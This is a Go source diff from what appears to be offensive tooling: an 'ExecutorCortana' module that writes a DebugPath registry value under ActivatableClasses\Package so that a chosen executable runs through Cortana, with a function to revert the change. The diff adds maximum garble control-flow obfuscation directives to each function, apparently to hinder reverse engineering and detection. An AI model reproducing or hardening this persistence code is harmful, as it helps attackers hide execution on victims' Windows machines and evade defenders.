@@ -12,7 +12,7 @@ import (
 )
 
 type ExecutorCortana struct{}
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorCortana) findKey() (string, error) {
 	nk, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Classes\\ActivatableClasses\\Package", registry.READ)
 	if err != nil {
@@ -35,7 +35,7 @@ func (e ExecutorCortana) findKey() (string, error) {
 	key := subkeys[n]
 	return key, nil
 }
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorCortana) Exec(path string) error {
 	kpath, err := e.findKey()
 	if err != nil {
@@ -50,7 +50,7 @@ func (e ExecutorCortana) Exec(path string) error {
 	err = k.SetStringValue("DebugPath", path)
 	return err
 }
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorCortana) Revert() error {
 	kpath, err := e.findKey()
 	if err != nil {
